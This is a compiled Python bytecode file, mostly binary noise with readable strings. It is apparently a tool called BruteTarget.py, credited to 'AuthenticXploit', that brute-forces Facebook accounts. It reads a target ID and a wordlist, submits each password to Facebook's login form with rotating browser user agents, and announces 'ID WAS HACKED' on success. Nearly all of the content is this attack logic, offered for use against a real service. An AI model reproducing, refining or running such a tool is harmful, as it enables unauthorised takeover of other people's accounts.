�
7��ac           @   sq  d  Z  y| d d l Z d d l Z d d l Z d d l Z d d l Z d d l Z d d l m Z d d l m Z d d l m	 Z	 Wn+ e
 k
 r� Z e d � d j e � GHn Xd Z
 d	 �  Z e d � e e
 � e e d
 � � Z e e d � � Z d Z d g Z d �  Z d �  Z d �  Z d �  Z e d k rmy e �  Wqme e f k
 rid GHe	 d � qmXn  d S(   su   
BruteTarget.py

Created by AuthenticXploit on 09/07/2021.
Copyright (c) 2021 Copyright Holder. All rights reserved.
i����N(   t   system(   t   sleep(   t   exitt   clears8   [32;1m[[31;1m![32;1m] [0;33mError [31;1m: [37;1m{}s  [91;1m
█.-.   .-.  .--.  .-. .-..-.   .-..-. .-..----. 
|  `.'  | / {} \ | {_} ||  `.'  || { } || {}  \
| |\ /| |/  /\  \| { } || |\ /| || {_} ||     /
`-' ` `-'`-'  `-'`-' `-'`-' ` `-'`-----'`----' 
[1;37m--------------------------------------------------
[1;93m➣ OWNER  :  Mahmud
[1;97m➣ FB     :  Mehedi Hasan Mahmud
[1;95m--------------------------------------------------

c         C   sD   x= |  d D]1 } t  j j | � t  j j �  t d d � q Wd  S(   Ns   
g       @iZ   (   t   syst   stdoutt   writet   flushR   (   t   st   c(    (    s   /sdcard/HamiiTarget.pyt	   slowprint'   s    
s3   [37;1mPUT FACEBOOK TARGET ID LINK [31;1m: [33;1ms-   [37;1mENTER YOUR WORLD LIST [31;1m: [33;1ms2   https://www.facebook.com/login.php?login_attempt=1sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1c          C   s�   y� t  j �  a t j �  }  t j t � t j t � t j	 |  � t j
 t � t j t � t j t  j
 j �  d d �t �  t �  d GHWn/ t  j k
 r� d GHt d � d GHt �  n Xd  S(   Nt   max_timei   sG   [32;1m[[31;1m![32;1m][33;1m Password does not exist in the wordlists.   
[32;1m[[31;1m![32;1m][33;1m No Connectioni   s(   [32;1m[[31;1m![32;1m] [31;1mExit[0m(   t	   mechanizet   Browsert   brt	   cookielibt   LWPCookieJart   set_handle_robotst   Falset   set_handle_redirectt   Truet
   set_cookiejart   set_handle_equivt   set_handle_referert   set_handle_refresht   _httpt   HTTPRefreshProcessort   menut   searcht   URLErrorR   R   (   t   cj(    (    s   /sdcard/HamiiTarget.pyt   main4   s"    




	
c         C   s�   t  j j d j |  � � t  j j �  d t j t � f g t _	 t j
 t � } t j d d � t
 t j d <|  t j d <t j �  } | j �  } | t k r� d | k r� d j |  � GHt d	 � t d
 � n  d  S(   NsE   [36;1m
[[33;1m-[36;1m] [37;1mTRYING PASSWORD [31;1m=> [33;1m{}
s
   User-agentt   nri    t   emailt   passt
   login_attempts;   [36;1m[[33;1m+[36;1m] [37;1mID WAS HACKED  => [32;1m{}s   [31;1mANY KEY to Exit....i   (   R   R   R   t   formatR   t   randomt   choicet
   useragentsR   t
   addheaderst   opent   logint   select_formR!   t   formt   submitt   geturlt	   raw_inputR   (   t   passwordt   sitet   subt   log(    (    s   /sdcard/HamiiTarget.pyt   bruteH   s    



c          C   s@   t  t d � }  x* |  D]" a t j d d � a t t � q Wd  S(   Nt   rs   
t    (   R)   t   passwordlistR0   t   replaceR4   (   t	   passwords(    (    s   /sdcard/HamiiTarget.pyR   W   s    
c          C   sw   yJ t  t d � }  |  j �  }  t GHd j t � GHd Gt |  � Gd GHd GHWn& t k
 rr d j t � GHt �  n Xd  S(   NR5   sC   [36;1m[[31;1m-[36;1m] [32;1mAccount to crack [31;1m> [0;33m{}s6   [36;1m[[31;1m-[36;1m] [32;1mLoaded [31;1m>[0;33mR9   s:   [36;1m[[31;1m-[36;1m] [33;1mCracking, please wait ...
sM   
[32;1m[[31;1m![32;1m][33;1m File wordlist [36;1m{} [33;1mNot Found[0m(	   R)   R7   t	   readlinest   bannerR$   R!   t   lent   IOErrorR   (   t   total(    (    s   /sdcard/HamiiTarget.pyR   _   s    	
t   __main__sB   [36;1m
[[31;1m![36;1m][33;1mDetects a forced stop program [0mi    (   sD   Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0se   Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1(   t   __doc__R   R   R   R%   t   ost   timeR    R   R   t   ImportErrort   fR$   R;   R
   t   strR/   R!   R7   R*   R'   R   R4   R   R   t   __name__t   KeyboardInterruptt   EOFError(    (    (    s   /sdcard/HamiiTarget.pyt   <module>   s>   
	

					
